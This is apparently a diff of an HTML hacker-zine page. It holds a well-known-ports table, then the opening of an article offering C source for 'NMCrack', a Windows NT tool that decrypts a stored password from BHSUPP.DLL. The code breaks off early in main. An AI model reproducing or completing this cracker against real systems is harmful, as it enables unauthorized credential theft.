+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 65&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TACACS-DS&nbsp; TACACS-Database Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [3,RHT]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 67&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BOOTPS&nbsp;&nbsp;&nbsp;&nbsp; Bootstrap Protocol Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [29,WJC2]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 68&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BOOTPC&nbsp;&nbsp;&nbsp;&nbsp; Bootstrap Protocol Client&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [29,WJC2]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 69&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TFTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Trivial File Transfer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [95,DDC1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 71&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETRJS-1&nbsp;&nbsp; Remote Job Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [8,RTB3]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 72&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETRJS-2&nbsp;&nbsp; Remote Job Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [8,RTB3]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 73&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETRJS-3&nbsp;&nbsp; Remote Job Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [8,RTB3]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 74&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETRJS-4&nbsp;&nbsp; Remote Job Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [8,RTB3]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 75&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private dial out service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private RJE service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FINGER&nbsp;&nbsp;&nbsp;&nbsp; Finger&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [44,KLH]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HTTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hiper Text Transfer Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [?]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 81&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HOSTS2-NS&nbsp; HOSTS2 Name Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [EAK1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 83&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MIT-ML-DEV MIT ML Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DPR]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 85&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MIT-ML-DEV MIT ML Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DPR]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 87&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private terminal link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SU-MIT-TG&nbsp; SU/MIT Telnet Gateway&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [MRC]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 91&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MIT-DOV&nbsp;&nbsp;&nbsp; MIT Dover Spooler&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [EBM]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 93&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DCP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Device Control Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DT15]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 95&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SUPDUP&nbsp;&nbsp;&nbsp;&nbsp; SUPDUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [20,MRC]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 97&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SWIFT-RVF&nbsp; Swift Remote Vitural File Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [MXR]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 98&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TACNEWS&nbsp;&nbsp;&nbsp; TAC News&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [FRAN]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; METAGRAM&nbsp;&nbsp; Metagram Relay&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [GEOF]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HOSTNAME&nbsp;&nbsp; NIC Host Name Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [45,JAKE]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 102&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ISO-TSAP&nbsp;&nbsp; ISO-TSAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [12,MTR]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 103&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HCF2]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X400-SND&nbsp;&nbsp; X400-SND&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HCF2]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 105&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSNET-NS&nbsp;&nbsp; Mailbox Name Nameserver&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [96,MAS3]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 107&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RTELNET&nbsp;&nbsp;&nbsp; Remote Telnet Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [76,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 109&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; POP-2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Post Office Protocol - Version 2&nbsp;&nbsp;&nbsp;&nbsp; [11,JKR1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>111&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SUNRPC&nbsp;&nbsp;&nbsp;&nbsp; SUN Remote Procedure Call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DXG]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 113&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AUTH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Authentication Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [99,MCSJ]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 115&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SFTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Simple File Transfer Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [56,MKL1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 117&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UUCP-PATH&nbsp; UUCP Path Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [35,MAE]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>119&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NNTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Network News Transfer Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [53,PL4]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 121&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ERPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HYDRA Expedited Remote Procedure Call[101,JXO]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 123&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Network Time Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [60,DLM1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 125&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCUS-MAP&nbsp; Locus PC-Interface Net Map Server&nbsp;&nbsp;&nbsp; [105,BXG]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCUS-CON&nbsp; Locus PC-Interface Conn Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [105,BXG]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 129&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PWDGEN&nbsp;&nbsp;&nbsp;&nbsp; Password Generator Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [107,FJW]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 130&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CISCO-FNA&nbsp; CISCO FNATIVE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [WXB]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 131&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CISCO-TNA&nbsp; CISCO TNATIVE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [WXB]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CISCO-SYS&nbsp; CISCO SYSMAINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [WXB]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 133&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STATSRV&nbsp;&nbsp;&nbsp; Statistics Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DLM1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 134&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; INGRES-NET INGRES-NET Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [MXB]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 135&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOC-SRV&nbsp;&nbsp;&nbsp; Location Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JXP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 136&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PROFILE&nbsp;&nbsp;&nbsp; PROFILE Naming System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [LLP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 137&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETBIOS-NS NETBIOS Name Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 138&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETBIOS-DGM NETBIOS Datagram Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 139&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETBIOS-SSN NETBIOS Session Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 140&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EMFIS-DATA EMFIS Data Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [GB7]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EMFIS-CNTL EMFIS Control Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [GB7]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 142&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BL-IDM&nbsp;&nbsp;&nbsp;&nbsp; Britton-Lee IDM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [SXS1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 143-159&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unassigned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 160-223&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Reserved&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 224-241&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unassigned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 243&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SUR-MEAS&nbsp;&nbsp; Survey Measurement&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [5,AV]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 245&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LINK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LINK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [10,RDB2]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 247-255&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unassigned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]</pre>
+<a href="#inicio">Volta ao início</a>
+
+<p><a name="NT"><hr></a><p>
+
+<h1>Sniffer pro NT (fonte)</h1>
+<b>Detonando o NT</b>
+<br>by <a href="mailto:cyberoptik@base.com.br">Cyber Optik</a> (<a href="mailto:cyberoptik@base.com.br">cyberoptik@base.com.br</a>)
+
+<p>Como este &eacute; o primeiro n&uacute;mero do zine, resolvi pegar leve
+com a mo&ccedil;ada. Este &eacute; um pequeno sniffer para Windows NT que
+qualquer Wannabe com um muito de c&eacute;rebro, consegue compilar... Lammers
+fiquem longe disso!!! Pode ser perigoso....(eheheh)
+<br>No pr&oacute;ximo n&uacute;mero vai rolar mais "coisas" sobre NT, valeu!!!
+
+<p>&nbsp;
+<pre>______________________Recorte_Daqui_pra_Baixo__________________________
+______________________________________________________________________
+
+#define STRICT
+#define MAX_FILE_SIZE 24576&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+#include&nbsp;<windows.h>
+#include&nbsp;<stdio.h>
+
+void DecryptPassword(LPBYTE lpEncryptedPassword, LPSTR&nbsp;
+lpszPlaintextPassword);
+BOOL GetEncryptedPassword(HANDLE hTargetFile, LPBYTE&nbsp;
+lpEncryptedPassword);
+void GetTargetFileFromUser(HANDLE* phTargetFile, LPSTR lpszTargetFile);
+
+HANDLE g_hStdIn, g_hStdOut;&nbsp;&nbsp;&nbsp;&nbsp; //Declaracao Global do StandardIN e do OUT
+
+void main(int argc, char* argv[])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+{
+&nbsp;&nbsp;&nbsp;&nbsp; HANDLE hTargetFile;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; BYTE lpEncryptedPassword[32];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; char lpszPlaintextPassword[17] = {0};
+&nbsp;&nbsp;&nbsp;&nbsp; char lpszOutputBuffer[80];
+&nbsp;&nbsp;&nbsp;&nbsp; char lpszTargetFile[MAX_PATH] = {0};
+&nbsp;&nbsp;&nbsp;&nbsp; char lpszUsage[] = "\nUsage: NMCrack [path to BHSUPP.DLL incluindo o
+&nbsp;filename]\n";
+&nbsp;&nbsp;&nbsp;&nbsp; LPTSTR lpszSystemDirectory = NULL;
+&nbsp;&nbsp;&nbsp;&nbsp; UINT nCount, nCount2;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; g_hStdIn = GetStdHandle(STD_INPUT_HANDLE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
